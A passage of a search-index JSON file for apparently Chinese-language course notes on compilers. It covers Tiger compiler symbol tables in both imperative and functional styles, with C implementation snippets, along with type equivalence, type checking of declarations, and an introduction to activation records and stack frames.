\u8981\u4e48\u63d2\u5165\uff0c\u8981\u4e48\u8986\u76d6</li> <li>\u8003\u8651 \\(\\sigma + \\{a \\mapsto \\tau 2\\}\\), \u4e14 \\(\\sigma\\) \u4e2d\u5df2\u7ecf\u542b\u6709 \\(\\{a \\mapsto \\tau 1\\}\\)</li> <li>\u63d2\u5165\u51fd\u6570\u4f1a\u4fdd\u5b58 \\(\\{a \\mapsto \\tau 1\\}\\)\uff0c\u5e76\u5c06 \\(\\{a \\mapsto \\tau 2\\}\\) \u63d2\u5165\u5728\u8868\u7684\u66f4\u524d\u9762<ul> <li>E.g., <code>hash(a)</code> -&gt; <code>&lt;a, \u03c42&gt;</code> -&gt; <code>&lt;a, \u03c41&gt;</code></li> </ul> </li> </ul> <p>pop items off items at front of bucket.</p> <ul> <li>\u8003\u8651 \\(\\sigma + \\{a \\mapsto \\tau 2\\}\\), \u4e14 \\(\\sigma\\) \u4e2d\u5df2\u7ecf\u542b\u6709 \\(\\{a \\mapsto \\tau 1\\}\\)</li> <li>\u5f53\u5728 <code>a</code> \u7684\u4f5c\u7528\u57df\u7684\u7ed3\u5c3e\u5904\u5b8c\u6210 <code>pop(a)</code> \u540e\uff0c\\(\\sigma\\) \u5c31\u88ab\u6062\u590d\u4e86<ul> <li>E.g. <code>hash(a)</code> -&gt; <code>&lt;a, \u03c42&gt;</code> -&gt; <code>&lt;a, \u03c41&gt;</code> \u53d8\u4e3a <code>hash(a)</code> -&gt;  <code>&lt;a, \u03c41&gt;</code></li> </ul> </li> </ul> <p>Warning</p> <p>\u4e3a\u4e86\u5904\u7406\u4e0d\u540c scope, \u8fd8\u9700\u5176\u4ed6\u8f85\u52a9\u4fe1\u606f\uff0c\u6bd4\u5982\u6307\u5bfc \u201c\u9700\u8981 pop \u51e0\u6b21\u201d</p>"}, {"location": "Course/cp/semantic/#functional-symbol-tables", "title": "Functional Symbol Tables", "text": "<p>Basic Idea</p> <ul> <li>\u5f53\u5b9e\u73b0\u73af\u5883 \\(\\sigma_2\\) (\\(\\sigma_2 = \\sigma_1 + \\{a \\mapsto \\text{int}\\}\\)) \u65f6</li> <li>\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8868 \\(\\sigma_2\\)\uff0c\u800c\u4e0d\u662f\u4fee\u6539 \\(\\sigma_1\\)</li> <li>\u4f46\u5220\u9664\uff0c\u56de\u9000\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8fd4\u56de\u5230 \\(\\sigma_1\\)</li> </ul> <p>\u5b9e\u73b0\u65b9\u5f0f\u662f\uff1abinary search trees (BSTs)</p> <ul> <li>Each node contains mapping from identifier (key) to binding. </li> <li>Use string comparison for \u201cless than\u201d ordering.</li> <li>\u5bf9\u4e8e\u8282\u70b9 \\(l\\), \u5b83\u7684\u5de6\u5b50\u6811 \\(L\\), \u53f3\u5b50\u6811 \\(R\\) \u6ee1\u8db3\uff1a<ul> <li>\u5bf9\u4e8e\u6240\u6709 \\(n \\in L\\), <code>key(n) &lt; key(l)</code></li> <li>\u5bf9\u4e8e\u6240\u6709 \\(n \\in R\\), <code>key(n) &gt;= key(l)</code></li> </ul> </li> </ul> <p>\u7528\u5148\u524d efficient impressive \u7684\u65b9\u5f0f\u4e5f\u80fd\u5b9e\u73b0\uff0c\u4f46\u662f\u4e0d\u591f\u9ad8\u6548</p> LookupInsert <p><code>O(logn)</code> for a balanced tree of n nodes</p> <p>Copy the nodes from the root to the parent of the inserted node</p> <p></p> Summary <ul> <li>Imperative Style : (side effects)<ul> <li>When beginning-of-scope entered, entries added to table using side-effects. (old table destroyed)</li> <li>When end-of-scope reached, auxiliary info used to remove previous additions. (old table reconstructed)</li> </ul> </li> <li>Functional Style : (no side effects)<ul> <li>When beginning-of-scope entered, new environment created by adding to old one, but old table remains intact</li> <li>When end-of-scope reached, retrieve old table.</li> </ul> </li> </ul> <p>\u5b83\u4eec\u5bf9 <code>lookup</code>, <code>insert</code>, <code>beginScope</code>, <code>endScope</code> \u7b49\u63a5\u53e3\u7684\u652f\u6301\uff0c\u590d\u6742\u5ea6\u4e0a\u5404\u6709\u4f18\u52bf</p>"}, {"location": "Course/cp/semantic/#symbols-in-the-tiger-compiler", "title": "Symbols in the Tiger Compiler", "text": "<p>\u5b9e\u73b0\u8868\u7684\u65f6\u5019\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff1a\u5bf9\u4e8e\u5224\u65ad <code>key value = string | (strcmp)</code>, \u6211\u4eec\u5728\u67e5\u627e\u7684\u65f6\u5019\u9700\u8981\u8fdb\u884c\u5927\u91cf\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83\u64cd\u4f5c</p> <p>\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff1a\u4f7f\u7528 <code>symbol</code> \u6570\u636e\u7ed3\u6784\u4ee3\u66ff</p> <ul> <li>\u5373\u6bcf\u4e2a <code>symbol</code> \u5bf9\u8c61\u90fd\u4e0e\u6574\u6570\u503c\u76f8\u5173\u8054</li> <li>\u76f8\u540c\u7684\u5b57\u7b26\u4e32\u6620\u5c04\u5230\u540c\u4e00\u4e2a <code>symbol</code> \u5bf9\u8c61</li> <li>\u4e8e\u662f\u4e4b\u524d\u6bd4\u8f83 <code>key value = symbol</code> \u53ef\u4ee5\u53d8\u6210\u7b80\u5355\u7684\u6574\u6570\u6bd4\u8f83</li> </ul>"}, {"location": "Course/cp/semantic/#implementation-of-symbol-tables", "title": "Implementation of Symbol Tables", "text": "<p>The interface of symbols and symbol tables:</p> <ul> <li><code>void*</code>: \u5728\u7f16\u8bd1\u5668\u4e2d\u4e3a\u4e0d\u540c\u76ee\u7684\u4f7f\u7528\u4e0d\u540c\u7684\u7ed1\u5b9a\u6982\u5ff5, e.g., <ul> <li>Type binding for types</li> <li>value binding for variables and functions</li> </ul> </li> </ul> <pre><code>typedef struct S_symbol_ *S_symbol;\nS_symbol S_Symbol(string name);\nstring S_name(S_symbol s);\n\ntypedef struct TAB_table_ *S_table;\nS_table S_empty(void);\nvoid S_enter(S_table t, S_symbol sym, void *value);\nvoid *S_look(S_table t, S_symbol sym);\nvoid S_beginScope(S_table t);\nvoid S_endScope(S_table t);\n</code></pre> mksymbol, S_Symbol, S_name <pre><code>static S_symbol mksymbol(string name, S_symbol next) {\n    S_symbol s = checked_malloc(sizeof(*s));\n    s-&gt;name = name;\n    s-&gt;next = next;\n    return s;\n}\n\nS_symbol S_Symbol(string name) {\n    int index = hash(name) % SIZE;\n    S_symbol syms = hashtable[index], sym;\n    for (sym = syms; sym; sym = sym-&gt;next)\n        if (strcmp(sym-&gt;name, name) == 0)\n            return sym;\n    sym = mksymbol(name, syms);\n    hashtable[index] = sym;\n    return sym;\n}\n\nstring S_name(S_symbol s) {\n    return s-&gt;name;\n}\n</code></pre> <ul> <li>\u7528 C \u8bed\u8a00\u5b9e\u73b0\u7684 Tiger \u7f16\u8bd1\u5668\u4f7f\u7528 <code>destructive update</code> \u7684\u65b9\u5f0f\u6765\u66f4\u65b0 environments</li> <li>An imperative table is implemented using a hash table.</li> </ul> S_empty, S_enter, S_look <pre><code>S_table S_empty(void) {\n    return TAB_empty();\n}\n\nvoid S_enter(S_table t, S_symbol sym, void *value) {\n    TAB_enter(t, sym, value);\n}\n\nvoid *S_look(S_table t, S_symbol sym) {\n    return TAB_look(t, sym);\n}\n</code></pre> <p>For destructive-update environments, \u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f\u5b9e\u73b0 <code>beginScope</code> \u548c <code>endScope</code>:</p> <ul> <li><code>S_beginScope</code>: \u8bb0\u4f4f\u8868\u683c\u7684\u5f53\u524d\u72b6\u6001\uff1b</li> <li><code>S_endScope</code>:  \u5c06\u8868\u6062\u590d\u5230\u6700\u8fd1\u4e00\u6b21 beginScope \u7684\u4f4d\u7f6e\u3002</li> </ul> S_beginScope, S_endScope <pre><code>static struct S_symbol_ marksym = { \u201c&lt;mark&gt;\u201d, 0 };\nvoid S_beginScope(S_table t) {\n    S_enter(t, &amp;marksym, NULL);\n}\n\nvoid S_endScope(S_table t) {\n    S_symbol s;\n    do\n        s = TAB_pop(t);\n    while (s != &amp;marksym);\n}\n</code></pre> <p>Auxiliary stack:</p> <ul> <li>Showing in what order the symbols were \u201cpushed\u201d into the symbol table. | \u663e\u793a\u7b26\u53f7\u8868\u4e2d\u7b26\u53f7\u7684\u987a\u5e8f</li> <li>As each symbol is popped, the head binding in its bucket is removed. \uff5c \u6bcf\u6b21\u5f39\u51fa\u4e00\u4e2a\u7b26\u53f7\uff0c\u5c31\u4f1a\u4ece bucket \u4e2d\u5220\u9664\u4e00\u4e2a binding</li> <li><code>beginScope</code>: pushes a special marker onto the stack | \u5c06\u4e00\u4e2a\u7279\u6b8a\u7684\u6807\u8bb0\u63a8\u5165\u6808\u4e2d</li> <li> <p><code>endScope</code>: pops symbols off the stack until finds the topmost  marker. | \u5f39\u51fa\u7b26\u53f7\u76f4\u5230\u627e\u5230\u6700\u9876\u90e8\u7684\u6807\u8bb0</p> </li> <li> <p>The auxiliary stack can be integrated into the Binder by having a global variable top showing the most recent Symbol bound in the table. | \u53ef\u4ee5\u5c06 auxiliary stack \u96c6\u6210\u5230 Binder \u4e2d\uff0c\u901a\u8fc7\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf <code>top</code> \u6765\u663e\u793a\u6700\u8fd1\u7ed1\u5b9a\u7684\u7b26\u53f7</p> </li> <li>Pushing: copy top into the prevtop field of the Binder. | \u5c06 <code>top</code> \u590d\u5236\u5230 <code>prevtop</code> \u5b57\u6bb5\u4e2d</li> </ul> Binder <pre><code>struct TAB_table_ { \n    binder table[TABSIZE]; \n    void *top;\n};\n\nstatic binder Binder(void *key, void *value, binder next, void *prevtop) {\n    binder b = checked_malloc(sizeof(*b));\n    b-&gt;key = key; \n    b-&gt;value = value; \n    b-&gt;next = next; \n    b-&gt;prevtop = prevtop;\n    return b;\n}\n</code></pre>"}, {"location": "Course/cp/semantic/#type-checking", "title": "Type Checking", "text": ""}, {"location": "Course/cp/semantic/#_2", "title": "\u7c7b\u578b\u53ca\u5176\u4f5c\u7528", "text": "\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7684\u7c7b\u578b <ul> <li>\u53d8\u91cf\u7684\u7c7b\u578b\uff1a<ul> <li>\u9650\u5236\u4e86\u53d8\u91cf\u5728\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u53d6\u503c\u8303\u56f4</li> </ul> </li> <li>\u7c7b\u578b\u5316\u7684\u8bed\u8a00 (typed language)\uff1a<ul> <li>\u53d8\u91cf\u90fd\u88ab\u7ed9\u5b9a\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u5982 C/C++\u3001Java\u3001Go</li> <li>\u8868\u8fbe\u5f0f\u3001\u8bed\u53e5\u7b49\u7a0b\u5e8f\u6784\u9020\u7684\u7c7b\u578b\u90fd\u53ef\u4ee5\u9759\u6001\u786e\u5b9a</li> </ul> </li> <li>\u672a\u7c7b\u578b\u5316\u7684\u8bed\u8a00 (untyped language)<ul> <li>\u4e0d\u9650\u5236\u53d8\u91cf\u503c\u8303\u56f4\u7684\u8bed\u8a00 (no static types, \u800c\u975e\u6ca1\u6709\u7c7b\u578b), \u5982 LISP\u3001JavaScript </li> </ul> </li> </ul> <p>\u7c7b\u578b\u5728\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7684\u4f5c\u7528:</p> <ul> <li>\u5f00\u53d1\u6548\u7387\uff1a\u66f4\u9ad8\u5c42\u6b21\u7684\u7f16\u7a0b\u62bd\u8c61, e.g.,<ul> <li>\u591a\u6001\u3001\u4ee3\u6570\u6570\u636e\u7c7b\u578b\u3001\u4f9d\u8d56\u7c7b\u578b\u2026 </li> <li>hoogle\u5229\u7528\u7c7b\u578b\u4fe1\u606f\u641c\u7d22API</li> </ul> </li> <li>\u8fd0\u884c\u6027\u80fd\uff1a\u7c7b\u578b\u6307\u5bfc\u7684\u7f16\u8bd1\u4f18\u5316, e.g.,<ul> <li>\u9759\u6001\u7c7b\u578b\u7ed1\u5b9a\u907f\u514d\u8fd0\u884c\u65f6\u68c0\u67e5</li> <li>\u7c7b\u578b\u4fe1\u606f\u4f18\u5316\u5185\u5b58\u5e03\u5c40</li> </ul> </li> <li>\u5b89\u5168\u53ef\u9760\uff1a\u5185\u5b58\u5b89\u5168\u4e43\u81f3\u529f\u80fd\u6b63\u786e, e.g.,<ul> <li>Rust\u7ebf\u6027\u7c7b\u578b\u4fdd\u969c\u5185\u5b58\u5b89\u5168</li> <li>LiquidHaskell \u7cbe\u5316\u7c7b\u578b\u4fdd\u969c\u529f\u80fd\u6b63\u786e</li> </ul> </li> </ul>"}, {"location": "Course/cp/semantic/#tiger", "title": "Tiger \u7c7b\u578b\u7cfb\u7edf", "text": "Type Checking \u4e2d\u7684\u5173\u952e\u95ee\u9898 <ul> <li>What are valid type expressions ?<ul> <li>\u603b\u5171\u6709\u54ea\u4e9b\u7c7b\u578b\uff0c\u6bcf\u4e2a\u7c7b\u578b\u8868\u8fbe\u5f0f\u5bf9\u5e94\u5230\u4ec0\u4e48?</li> <li>e.g., int, string, unit, nil, array of int, record \u2026</li> </ul> </li> <li>How to define two types are equivalent ?<ul> <li>\u6bd4\u5982\uff0c\u4e24\u4e2a record \u7c7b\u578b\u662f\u5426\u76f8\u540c?</li> </ul> </li> <li>What are the typing rules ?<ul> <li>\u8981\u68c0\u67e5\u4ec0\u4e48\uff0c\u6bd4\u5982\u5f62\u53c2\u548c\u5b9e\u53c2\u662f\u5426\u4e00\u81f4?</li> </ul> </li> </ul> <p>1) \u9996\u5148\u56de\u987e Tiger \u8bed\u8a00\u603b\u5171\u6709\u54ea\u4e9b\u7c7b\u578b\uff1a</p> <ul> <li>\u57fa\u672c\u7c7b\u578b\uff1aint, string</li> <li>\u590d\u5408\u7c7b\u578b\uff1arecord, array | using records and arrays from other types (primitive, record, or array)</li> </ul> \u7c7b\u578b\u7684\u6587\u6cd5\u5b9a\u4e49\u548c\u58f0\u660e\u6848\u4f8b <p></p> <p>\u90a3\u4e48\u5982\u4f55\u5c06 type identifier \u548c expression \u7ed1\u5b9a\u8d77\u6765\uff1f</p> <ul> <li>\u5f53\u5904\u7406\u76f8\u4e92\u9012\u5f52\u7c7b\u578b\u65f6\uff1a<code>Ty_Namw(sym, NULL)</code> <ul> <li>a place-holder for the type-name <code>sym</code></li> </ul> </li> </ul> <p>2) \u7c7b\u578b\u7b49\u4ef7 (Type Equivalence)\uff1a</p> <p>\u6709\u5982\u4e0b\u4e24\u79cd\u7b49\u4ef7\u5173\u7cfb\uff1a</p> <ul> <li>Name equivalence (NE): T1 and T2 are equivalent iff T1 and T2 are identical type names defined by the exact same type declaration.</li> <li>Structure equivalence (SE): T1 and T2 are equivalent iff T1 and T2 are composed of the same constructors applied in the same order.</li> </ul> <pre><code>type a = {x:int, y:int}\ntype ptr = {x:int, y:int}\nfunction f(a : point) = a\n</code></pre> <p>Tiger \u4f7f\u7528 Name Equivalence\uff0cE.g., point and ptr are equivalent under SE but not equivalent under NE</p> <p>Type equivalence \u5f71\u54cd\u7c7b\u578b\u68c0\u67e5\uff0c\u5982\u662f\u5426\u9700\u8981\u5728 Typing environment \u589e\u52a0\u65b0\u7684\u7c7b\u578b? \u51fd\u6570\u7684\u5f62\u53c2\u548c\u5b9e\u53c2\u7c7b\u578b\u8bc6\u522b\u5339\u914d?</p> <p>\u7c7b\u578b\u7b49\u4ef7</p> <ul> <li>\u8981\u6ce8\u610f\u6bcf\u4e00\u4e2a <code>record type expression</code> \u90fd\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u3001\u4e0d\u540c\u7684 <code>record type</code></li> </ul> Example IllegalLegal <pre><code>let type a = {x:int, y:int}\n    type b = {x:int, y:int}\n    var i : a := ...\n    var j : b := ...\nin i := j\nend\n</code></pre> <pre><code>let type a = {x:int, y:int}\n    type b = a\n    var i : a := ...\n    var j : b := ...\nin i := j\nend\n</code></pre> <p>3) Tiger \u7684\u547d\u540d\u7a7a\u95f4</p> <p>Tiger \u6709\u4e24\u4e2a\u72ec\u7acb\u7684\u547d\u540d\u7a7a\u95f4\uff1a</p> <ul> <li>Types</li> <li>Variables and functions</li> </ul> TypeVariable and Function <pre><code>let type a = int\n    var a := 1\nin ...\nend\n</code></pre> <ul> <li>Both <code>a</code> can be used.</li> </ul> <pre><code>let function a(b : int) = ...\n    var a := 1\nin ...\nend\n</code></pre> <ul> <li>variables and functions of the same name cannot both be in scope simultaneously (one will hide the other) | \u53d8\u91cf\u548c\u51fd\u6570\u4e0d\u80fd\u540c\u65f6\u5b58\u5728\uff0c\u4e00\u4e2a\u4f1a\u9690\u85cf\u53e6\u4e00\u4e2a</li> <li>var <code>a</code> hides function <code>a</code></li> </ul>"}, {"location": "Course/cp/semantic/#tiger_1", "title": "Tiger \u7c7b\u578b\u68c0\u67e5", "text": "<p>Tiger \u8bed\u4e49\u5206\u6790\u9700\u8981\u7ef4\u62a4 2 \u4e2a\u73af\u5883:</p> <ul> <li>Types environment: Maps type symbol to type that it stands for <code>Symbol -&gt; Ty_ty</code></li> <li>Variables and functions environment:<ul> <li>Maps variable symbol to its type. <ul> <li>E.g., <code>Symbol -&gt; Ty_ty</code></li> </ul> </li> <li>Maps function symbol to parameter and result types.<ul> <li>E.g., <code>Symbol -&gt; struct {Ty_tyList formals; Ty_ty result}</code></li> </ul> </li> </ul> </li> </ul> \u9884\u5b9a\u4e49\u73af\u5883 codeExplanation <pre><code>typedef struct E_envent_ *E_envent;\nstruct E_enventry_ {\n    enum {E_varEntry, E_funEntry} kind; \n    union {\n        struct {Ty_ty ty;} var;\n        struct {Ty_tyList formals; Ty_ty result;} fun; \n        } u;\n};\nE_enventry E_VarEntry(Ty_ty ty); \nE_enventry E_FunEntry(Ty_tyList formals, Ty_ty result);\n\nS_table E_base_tenv(void); /* Ty_ty environment */ \nS_table E_base_venv(void); /* E_enventry environment */\n</code></pre> <p>Predefined type and value environments</p> <ul> <li>Type environment \u201cint\u201d \\(\\mapsto\\) <code>Ty_Int()</code>, \u201cstring\u201d \\(\\mapsto\\) <code>Ty_String()</code></li> <li>Value environment contains predefined functions of Tiger</li> </ul> <p>\u5bf9\u4e8e\u8bed\u4e49\u5206\u6790, \u65e2\u505a\u8bed\u4e49\u68c0\u67e5\u53c8\u505a\u4e2d\u95f4\u4ee3\u7801 (IR Code) \u751f\u6210\u3002\u540c\u65f6\u5bf9 expressions \u548c declarations \u8fdb\u884c\u68c0\u67e5</p> <p>\u73b0\u5728\u8fd8\u4e0d\u7528\u8003\u8651 IR code \u751f\u6210</p> Implementation <ul> <li>The Semant module (semant.h, semant.c) performs semantic analysis including type-checking \u2013 of abstract syntax</li> <li>Semantic analysis: four recursive functions over AST</li> </ul> Semantic analysis <pre><code>Struct expty transVar (S_table venv, S_table tenv, A_var v); \nstruct expty transExp (S_table venv, S_table tenv, A_exp a);\nvoid transDec (S_table venv, S_table tenv, A_dec d);\nTy_ty transTy (S_table tenv, A_ty a);\n</code></pre> <ol> <li>Type-checking expressions </li> <li>Type-checking declarations<ul> <li>Variable declarations</li> <li>Type declarations</li> <li>Function declarations</li> <li>Recursive type declarations</li> <li>Recursive function declarations</li> </ul> </li> </ol>"}, {"location": "Course/cp/semantic/#type-checking-expressions", "title": "Type-checking expressions", "text": "<pre><code>Struct expty transExp (S_table venv, S_table tenv, A_exp a);\n</code></pre> <ul> <li><code>transExp</code>: Type-checking expressions: query &amp;&amp; update the environments</li> <li>Input: <ul> <li><code>venv</code>: value environment</li> <li><code>tenv</code>: type environment</li> <li><code>a</code>: expression to be type-checked</li> </ul> </li> <li>Output:<ul> <li>a translated expression and its Tiger-language type</li> </ul> </li> </ul> <p>Rules:</p> <ul> <li>Function call: the types of formal parameters must be equivalent to the types of actual arguments.</li> <li>If-expression: <code>if exp1 then exp2 else exp3</code><ul> <li>The type of <code>exp1</code> must be integer, the types of <code>exp2</code> and <code>exp3</code> should be equivalent.</li> </ul> </li> </ul> <p>\u6b64\u5904\u4e3e\u4e24\u4e2a\u4f8b\u5b50\uff0c\u5176\u4f59\u89c1\u864e\u4e66\u9644\u5f55</p>"}, {"location": "Course/cp/semantic/#type-checking-declarations", "title": "Type-checking declarations", "text": "<p>Declarations \u4f1a\u4fee\u6539 environments\uff0c\u4e14\u5728 Tiger \u8bed\u8a00\u4e2d\uff0cdeclaration \u53ea\u80fd\u51fa\u73b0\u5728 <code>let</code> \u4e2d (<code>let</code> \u4e2d\u7684\u58f0\u660e\u53ef\u4ee5\u5728 <code>in</code> \u4e2d\u4f7f\u7528)</p> <p>1) Variable Declarations</p> <ul> <li>Processing a variable declaration without a type constraint:</li> </ul> <pre><code>var x := exp\n</code></pre> <ul> <li>Processing a variable declaration with a type constraint:<ul> <li>\u9700\u8981\u68c0\u67e5 constraint \u548c initializing expression \u7684\u7c7b\u578b\u662f\u5426\u4e00\u81f4</li> <li>\u540c\u65f6\uff0cinitializing expressions of type <code>Ty_Nil</code> must be constrained by a <code>Ty_Record</code> type.</li> </ul> </li> </ul> <pre><code>var x: type-id := exp\n</code></pre> <p>2) Type Declarations:</p> <p>\u975e\u9012\u5f52\u7c7b\u578b\u58f0\u660e\uff0c\u5982 <code>type type-id = ty</code></p> <ul> <li><code>transTy</code> \u51fd\u6570\u5c06 <code>ty</code> \u9012\u5f52\u8f6c\u6362\u4e3a <code>Ty_ty</code> \u7c7b\u578b</li> </ul> Info <p>\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u62bd\u8c61\u8bed\u6cd5\u6811 (AST) \u8282\u70b9\u4e0a\u7684\u7c7b\u578b\u4fe1\u606f (A_ty) </p> <pre><code>void transDec (S_table venv, S_table tenv, A_dec d) {\n    ...\n    case A_typeDec: {\n        S_enter(tenv, d-&gt;u.type-&gt;name, transTy(tenv, d-&gt;u.type-&gt;ty));\n    }\n    ...\n}\n</code></pre> <p>NOTICE: This program fragment only handles the type-declaration list of length 1!</p> <p>3) Function Declarations:</p> <p>\u975e\u9012\u5f52\u51fd\u6570\u58f0\u660e\uff0c\u5982 <code>function id (tyfields) \uff1a type-id = exp</code></p> <p>\u2026</p> <p>4) Recursive Type Declarations:</p> <p>\u9996\u5148\u8003\u8651\u5982\u4f55\u5c06\u58f0\u660e <code>type list = {first:int, res:list}</code> \u8f6c\u5316\u4e3a internal type representations\uff1f</p> <ul> <li>\u56f0\u96be\u5728\u4e8e\uff1a\u9700\u8981\u4ece type environment \u4e2d\u627e\u5230 <code>list</code> \u7684\u5b9a\u4e49\uff0c\u4f46\u662f\u6b64\u65f6 <code>list</code> \u8fd8\u6ca1\u6709\u88ab\u5b9a\u4e49\u3002</li> <li>\u89e3\u51b3\u529e\u6cd5\u662f\uff1ause two passes<ol> <li>Put all the \u201cheaders\u201d in the environment first (\u5373\u4fbf\u4ed6\u4eec\u8fd8\u6ca1\u6709 bodies)<ol> <li>\u4f8b\u5982\u4e0a\u4f8b\u4e2d\uff1a<code>type list =</code> \u5c31\u662f\u4e00\u4e2a header</li> <li>Use the special \u201cname\u201d type for the header</li> </ol> </li> <li>Call <code>transTy</code> on the \u201cbody\u201d of the type declaration<ol> <li>\u5bf9\u4e8e\u4e0a\u4f8b\uff0crecord type expression <code>{first:int, res:list}</code> \u5c31\u662f body</li> <li>The type that <code>transTy</code> returns can then be assigned into the ty field within the <code>Ty_Name</code> struct.</li> </ol> </li> </ol> </li> </ul> <p>Tiger \u8bed\u8a00\u7684\u91cd\u8981\u7279\u6027\u4e4b\u4e00</p> <p>Every cycle in a set of mutually recursive type declarations MUST pass through a record or array declaration\uff01| \u5728\u4e00\u7ec4\u76f8\u4e92\u9012\u5f52\u7684\u7c7b\u578b\u58f0\u660e\u4e2d\uff0c\u6bcf\u4e2a\u5faa\u73af\u90fd\u5fc5\u987b\u7ecf\u8fc7\u8bb0\u5f55\u6216\u6570\u7ec4\u58f0\u660e</p> Example <p></p> \u624b\u52a8\u9012\u5f52\u51fd\u6570\u58f0\u660e <ul> <li>\u624b\u52a8\u5904\u7406\u9012\u5f52\u51fd\u6570\u4e5f\u662f\u7c7b\u4f3c.E.g., <code>f call g, g call f</code></li> <li>Problem: \u5728\u5904\u7406\u51fd\u6570\u58f0\u660e\u7684\u53f3\u4fa7\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9047\u5230 env \u4e2d\u5c1a\u672a\u5b9a\u4e49\u7684\u7b26\u53f7</li> <li>Solution: <ul> <li>First pass: gathers information about the header of each function but leaves the bodies of the functions untouched.</li> <li>Second pass: processes the bodies of all functions with the augmented environment.</li> </ul> </li> </ul>"}, {"location": "Course/cp/semantic/#activation-record", "title": "Activation Record", "text": "<p>\u8f83\u7b80\u5355\uff0c\u53ef\u7565\u770b</p> Overview of a Morden Processor <p>\u7531\u56db\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>ALU \u7b97\u672f\u903b\u8f91\u5355\u5143\uff1a\u6267\u884c\u7b97\u672f\u548c\u903b\u8f91\u8fd0\u7b97</li> <li>Registers \u5bc4\u5b58\u5668\uff1a\u5b58\u50a8\u4e34\u65f6\u6570\u636e (\u6709\u9650\u6570\u91cf\u4f46\u901f\u5ea6\u5feb\uff0c\u4e14\u7528\u9014\u5927\u591a\u76f8\u540c\uff0c\u5c11\u90e8\u5206\u6709\u7279\u6b8a\u7528\u9014\uff0c\u5982 PC, SP)</li> <li>Control: \u63a7\u5236\u5355\u5143\uff0c\u6267\u884c\u6307\u4ee4\uff0c\u63a7\u5236\u6570\u636e\u6d41\u5411 (\u6307\u4ee4\u5b58\u50a8\u5728\u5185\u5b58\u4e2d)</li> <li>Memory: \u5b58\u50a8\u6570\u636e\u548c\u6307\u4ee4 (\u5730\u5740\u7a7a\u95f4\u662f\u7a0b\u5e8f\u4f7f\u7528\u5185\u5b58\u7684\u65b9\u5f0f)</li> </ul> <p>\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6 \u5185\u5b58\u5e03\u5c40 \u5982\u4e0b\uff1a</p> <p></p> <p>\u672c\u8282\u805a\u7126\u4e8e Activation Record\uff0c\u5373\u6d3b\u52a8\u8bb0\u5f55</p> <p>\u6d3b\u52a8\u8bb0\u5f55\u5728\u51fd\u6570 (Function)\u3001\u8fc7\u7a0b (Procedure) \u548c\u65b9\u6cd5 (Method) \u8c03\u7528\u4e2d\u8d77\u7740\u91cd\u8981\u4f5c\u7528\uff0c\u5176\u5b9e\u5c31\u662f\u51fd\u6570\u8c03\u7528\u7684\u6808\u5e27</p> <p>\u51fd\u6570\u548c API\u3001ABI \u5f88\u76f8\u4f3c\uff1a</p> <ul> <li>API (Application Programming Interface): \u6e90\u7a0b\u5e8f\u4e4b\u95f4\u7684\u63a5\u53e3</li> <li>ABI (Application Binary Interface): \u672c\u8282\u7684\u4e3b\u9898\u5c31\u662f\u5982\u4f55\u5b9e\u73b0 ABI <ul> <li>\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u4e4b\u95f4\u7684\u63a5\u53e3 (\u751a\u81f3\u53ef\u4ee5\u662f\u4e0d\u540c\u7f16\u8bd1\u5668\u7f16\u8bd1\u7f16\u7a0b\u8bed\u8a00\u7684\u7a0b\u5e8f)</li> <li>Conventions on low-level details\uff1a<ul> <li>\u5982\u4f55\u4f20\u9012\u53c2\u6570\uff1f</li> <li>\u5982\u4f55\u8fd4\u56de\u503c\uff1f</li> <li>\u5982\u4f55\u5904\u7406\u5bc4\u5b58\u5668\uff1f</li> <li>\u2026</li> </ul> </li> </ul> </li> </ul> <ul> <li>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cfunction \u548c method \u89c6\u4e3a\u540c\u4e00\u79cd\u4e1c\u897f\u3002 </li> <li>tiger \u5c06\u8fc7\u7a0b\u548c\u51fd\u6570\u533a\u5206\u5f00\u6765\uff0c\u8fc7\u7a0b\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u51fd\u6570\u6709\u8fd4\u56de\u503c</li> </ul>"}, {"location": "Course/cp/semantic/#stack-frame", "title": "Stack Frame", "text": "Function Invocation <p>An invocation of function P is an activation of P \u90a3\u4e48\u5982\u4f55\u4fdd\u5b58\u5c40\u90e8\u53d8\u91cf\uff1f</p> <ul> <li>Each invocation has its own instantiation of local variables | \u6bcf\u6b21\u8c03\u7528\u90fd\u6709\u81ea\u5df1\u7684\u5c40\u90e8\u53d8\u91cf\u5b9e\u4f8b\u5316</li> <li>\u51fd\u6570\u8c03\u7528\u9075\u5faa\u540e\u8fdb\u5148\u51fa\uff08LIFO\uff09\u539f\u5219</li> <li>\u4f7f\u7528 LIFO \u6570\u636e\u7ed3\u6784 \u2014\u2014 \u4e00\u4e2a\u6808</li> </ul> <ul> <li>Activation record Or stack frame (\u6808\u5e27): a piece of memory on the stack for a function</li> <li>\u6808\u5e27\u8fde\u63a5\u4e86 caller \u548c callee, E.g.,<ul> <li>Relevant machine state (saved registers, return address) | \u76f8\u5173\u673a\u5668\u72b6\u6001</li> <li>Space for return value | \u8fd4\u56de\u503c\u7a7a\u95f4</li> <li>Space for local data | \u672c\u5730\u6570\u636e\u7a7a\u95f4</li> <li>Pointer to activation for accessing non-local data | \u8bbf\u95ee\u975e\u672c\u5730\u6570\u636e\u7684\u6fc0\u6d3b\u6307\u9488</li> </ul> </li> </ul> <p>\u7531\u6b64\u5f15\u5165 \u5173\u952e\u95ee\u9898\uff1a\u5982\u4f55\u5e03\u5c40 Activation record\uff0c\u4ee5\u4fbf\u8c03\u7528\u8005\u548c\u88ab\u8c03\u7528\u8005\u80fd\u591f\u6b63\u5e38\u901a\u4fe1\uff1f</p>"}, {"location": "Course/cp/semantic/#_3", 